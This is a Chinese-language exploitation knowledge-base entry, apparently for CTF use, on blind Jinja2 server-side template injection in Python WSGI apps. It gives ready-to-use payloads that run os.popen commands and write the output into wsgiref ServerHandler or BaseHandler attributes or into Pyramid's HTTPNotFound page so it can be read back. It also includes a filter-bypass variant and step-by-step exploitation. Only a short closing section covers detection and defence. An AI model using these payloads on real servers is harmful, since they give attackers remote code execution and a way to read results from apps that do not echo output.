---
id: web-python-ssti-wsgiref-handler-attribute-response-hijack
title: Python SSTI 无回显第二条出路：覆盖 wsgiref ServerHandler 的 http_version/server_software/error_body 与 pyramid HTTPNotFound 的 explanation/title，把命令输出顶到响应头或错误页
type: scenario
domain: web
path: web/python/ssti
technique: ssti-wsgiref-handler-attribute-response-hijack
tags:
- python
- pyramid
- wsgiref
- jinja2
- ssti
- no-echo
- file-write
- waf-bypass
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:25:58+08:00'
  notes: 已对照原文核对；本次核对未读取图片；setattr 改写 wsgiref.simple_server.ServerHandler 的 http_version/server_software、wsgiref.handlers.BaseHandler.error_body（bytes 需 encode）、pyramid.httpexceptions.HTTPNotFound 的 explanation/title 五条回显通道，以及 lipsum.__spec__.__init__.__globals__.sys.modules 的取模块路径与原文 payload 逐条一致；未验证点：改类属性对后续请求生效的时间点与中间层是否会吃掉状态行，原文以本地 demo 验证，未在真实环境复测
url: /docs/web/python/ssti/web-python-ssti-wsgiref-handler-attribute-response-hijack/
draft: false
kb_aliases:
- wsgiref 无回显
- ServerHandler http_version 回显
- server_software 回显
- BaseHandler error_body 回显
- HTTPNotFound explanation 回显
- Pyramid SSTI 无回显
- 污染 WSGI handler 属性
---

## 一句话结论

当 Jinja2 渲染结果被 `return Response('success')` 之类吞掉、命令执行拿不到回显时，除了写文件，还有一条更短的出路：SSTI 里能拿到完整 Python 对象图，就能 `setattr` 到 WSGI 服务器自己用来拼响应头的类属性上——把 `wsgiref.simple_server.ServerHandler.http_version`、`server_software`、`BaseHandler.error_body` 改成命令输出，或者改 `pyramid.httpexceptions.HTTPNotFound.explanation`/`title`——下次响应发出时，这些值会被原样写进状态行、`Server:` 头或 404/500 页面，于是无回显变成有回显。

## 原理

- **WSGI 应用与 HTTP 服务器之间只有一层 `ServerHandler`**：`wsgiref.simple_server.make_server()` 用 `WSGIRequestHandler` + `ServerHandler` 把 WSGI 的 `(status, headers, body)` 拼成 HTTP 报文。`ServerHandler.send_headers()` 里调用 `send_preamble()`，报文首行是 `"%s %s\r\n" % (self.http_version, self.status)`，所以 **`http_version` 和 `status` 这两个实例/类属性会直接出现在响应第一行**；`Server:` 头来自 `server_software`。这些属性是普通的 Python 类属性，`setattr` 就能改。
- **上下文里能拿到模块对象**：SSTI 的常规起手式 `lipsum.__spec__.__init__.__globals__`（Pyramid/Flask 里 `lipsum` 由框架注入）带着 `sys`，于是 `sys.modules.wsgiref.simple_server.ServerHandler` 就是类本身；再 `lipsum.__globals__.__builtins__.setattr(cls, "http_version", cmd_output)` 即完成污染。改的是**类属性**，所以对随后所有请求生效（不只是当前响应）。
- **错误页同样是模板字符串**：`wsgiref.handlers.BaseHandler.error_body` 默认是 `b"A server error occurred.  Please contact the administrator."`，500 时原样输出；`BaseHandler` 是 `ServerHandler` 的父类，改它影响面更广。注意它的类型是 `bytes`，所以 `popen(...).read()` 后面要 `.encode()`。
- **框架层的错误页更好用**：Pyramid 的 404 由 `pyramid.httpexceptions.HTTPNotFound` 生成，页面内容由该类的 `explanation`（正文）与 `title`（标题）属性拼成；改这两个属性后，随便访问一个不存在的路由，404 页面就会把命令输出显示出来。相比改 `http_version`，这种方式不破坏 HTTP 状态行、更隐蔽。
- **为什么这算完整利用而不是"半条链"**：SSTI → 任意 Python 代码执行本身就是完整 RCE；这里的增量是"在结果不回显的前提下仍能稳定取回输出"，与写文件异曲同工，但不需要目录可写、不需要二次请求读文件，只需一次请求 + 一次正常访问。

## 触发条件

- 用户输入被当模板执行（`jinja2.Environment(loader=BaseLoader()).from_string(...)`、`render_template_string`），未使用 `SandboxedEnvironment`。
- 渲染结果不回显，或只回一个固定字符串；但服务由 `wsgiref.simple_server`/`wsgiref` 系 handler 提供服务（Pyramid、Bottle 的开发服务器、自建 `make_server`）。
- 上下文中有能落到 `sys.modules` 的对象（`lipsum`、`cycler`、`config`、`request` 任一即可）。
- 目标进程在收到请求后仍会继续发响应（改 `http_version` 影响所有后续响应，改错误页只在对应状态码时体现）。

## 利用步骤

1. 先确认 SSTI 可执行任意表达式：`{{lipsum.__spec__.__init__.__globals__.sys.version}}` 之类是否正常渲染（若只返回固定文案，说明结果被吞，进入下一步）。
2. 拿 handler 类：`{{lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler}}`；确认能访问即等于任意 Python 对象图可达。
3. 把命令输出写进 `http_version`/`server_software` 类属性，然后正常访问任意路由，从响应首行或 `Server:` 头读出结果。
4. 若首行/头部被中间层（反向代理、框架日志）吃掉，改用 500 错误页：把 `BaseHandler.error_body`（bytes，需 `.encode()`）改成命令输出，再制造一次 500。
5. 框架是 Pyramid 时优先用 404：把 `HTTPNotFound.explanation` 或 `title` 改成命令输出，访问不存在的路由读取。
6. 命令有后台进程限制（`system`/`popen` 被禁）时，先用 `os.popen`；再不行用 `subprocess.check_output`、`open('/flag').read()` 之类纯 Python 读文件。

## PoC

响应头回显（`http_version`，出现在状态行）：

```jinja2
{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,"http_version",lipsum.__globals__.__builtins__.__import__('os').popen('id').read())}}
```

`Server:` 头回显：

```jinja2
{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,"server_software",lipsum.__globals__.__builtins__.__import__('os').popen('id').read())}}
```

500 错误页回显（`error_body` 是 bytes，注意 `.encode()`）：

```jinja2
{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.handlers.BaseHandler,"error_body",lipsum.__globals__.__builtins__.__import__('os').popen('whoami').read().encode())}}
```

属性过滤器写法（`__` 被拦时用 `attr`）：

```jinja2
{{lipsum['__globals__']['__builtins__']['setattr']((((lipsum|attr('__spec__'))|attr('__init__')|attr('__globals__'))['sys']|attr('modules'))['wsgiref']|attr('handlers')|attr('BaseHandler'),'error_body',lipsum['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']()['encode']())}}
```

Pyramid 404 页回显（`explanation` / `title`）：

```jinja2
{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.pyramid.httpexceptions.HTTPNotFound,"explanation",lipsum.__globals__.__builtins__.__import__('os').popen('id').read())}}
```

```jinja2
{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.pyramid.httpexceptions.HTTPNotFound,"title",lipsum.__globals__.__builtins__.__import__('os').popen('id').read())}}
```

## 变体与关联

- 落点可继续扩展：`status`（状态行第二部分）、`ServerHandler.server_software` 之外的 `sys_version`、`http_version`；`WSGIRequestHandler` 的 `server_version`；框架侧的 `DebugInformation`、`HTTPError.code`。
- 换成 gunicorn/uWSGI 时 `wsgiref` 不在进程里，则改用「异常信息回显」：把命令输出 `raise Exception(cmd)`，由框架 debug/错误页吐出；或写 `app.config['PROPAGATE_EXCEPTIONS']`。
- 与写文件路线的取舍：写文件需要可写目录、且要额外一次请求去读；改 handler 属性只需一次请求，但会污染全局状态（改 `http_version` 后所有响应首行都变），生产环境更易被监控发现。
- 关联：[[web-python-ssti-jinja2-noecho-flag-write-into-source]]（同一"无回显"前提下的写文件出链）、[[web-python-ssti-jinja2-subclasses-index-rce]]（入口绕过的基础手法）、[[web-python-ssti-jinja2-flask-globals-rce]]（`__globals__` 起手式）。

## 检测与防御

- 不要对用户输入调用 `from_string`/`render_template_string`；必须动态渲染时用 `SandboxedEnvironment` 并禁用 `attr`、`[]`、`__globals__` 可达的全局。
- 把 `lipsum`、`cycler`、`config`、`request` 等易被当跳板的全局从模板上下文移除。
- 检测：模板输入中出现 `setattr(`、`__globals__`、`sys.modules`、`wsgiref`、`httpexceptions`、`popen`；同一来源请求后响应状态行/`Server:` 头出现 `id`/`uid=`/换行等异常内容；WSGI 服务器日志里状态行非法。
- 修复后自检：直接对 `ServerHandler.http_version` 等属性做只读封装或改用固定常量，不让运行期 `setattr` 影响报文生成。
